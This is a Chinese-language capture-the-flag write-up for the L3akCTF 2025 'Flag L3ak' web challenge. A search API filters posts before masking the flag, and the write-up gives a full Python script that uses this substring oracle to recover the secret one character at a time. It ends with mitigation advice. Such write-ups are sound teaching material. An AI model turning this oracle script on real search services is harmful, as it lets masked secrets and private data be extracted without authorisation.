# L3akCTF 2025 Flag L3ak Writeup

## 题目简述

题目提供一个博客搜索接口 `/api/search`。每次查询必须恰好为 3 个字符，返回结果中的真正 flag 会被替换成等长星号，页面上只能看到被遮盖的内容。

搜索过滤发生在遮盖之前，因此接口仍会泄露某个三字符子串是否存在于原始 flag。决定性障碍是利用该布尔信息逐字符恢复秘密，本文按 Web 归档。

## 解题过程

### 定位信息泄露

服务端先用原始 post 做包含判断：

```javascript
const matchingPosts = posts.filter(post =>
  post.title.includes(query) ||
  post.content.includes(query) ||
  post.author.includes(query)
);
```

只有筛选完成后，它才对返回内容执行：

```javascript
post.content.replace(FLAG, "*".repeat(FLAG.length))
```

因此遮盖只能阻止直接读取，不能阻止查询原文。只要提交的三字符窗口出现在 flag 中，标题为 `Not the flag?` 的真实 flag 文章就会进入结果。

### 滑动三字符窗口

已知格式前缀为 `L3AK{`。假设已经恢复到字符串 `known`，取其最后两个字符并枚举下一个字符 $c$：

```text
query = known[-2:] + c
```

如果响应结果包含标题 `Not the flag?`，说明这个三字符窗口出现在隐藏 flag 中，可以把 $c$ 追加到已知前缀。标题检查很重要，因为查询也可能命中其他文章或题目内置的假 flag。

完整脚本如下：

```python
import string
import requests

url = "http://target/api/search"
alphabet = string.ascii_letters + string.digits + string.punctuation
flag = "L3AK{"

while not flag.endswith("}"):
    for ch in alphabet:
        query = flag[-2:] + ch
        response = requests.post(url, json={"query": query}).json()

        if any(post["title"] == "Not the flag?"
               for post in response["results"]):
            flag += ch
            print(flag)
            break
    else:
        raise RuntimeError("当前字符没有候选，检查字符集或已知前缀")

print(flag)
```

逐轮结果最终收敛为：

```text
L3AK{L3ak1ng_th3_Fl4g??}
```

两个问号是 flag 正文的一部分，并非未知字符占位符。

## 方法总结

本题属于典型的子串存在性 oracle。服务器虽然对输出做了脱敏，却让攻击者控制筛选条件；“目标记录是否返回”本身就是一位可观测信息。利用已知前缀和长度为 3 的重叠窗口，就能把这一位信息转化为逐字符恢复。

安全实现应在搜索前先移除敏感字段，或根本不允许搜索秘密内容。先用原文过滤、再遮盖响应无法消除侧信道；限制单次查询长度也只会降低速度，不会改变可恢复性。
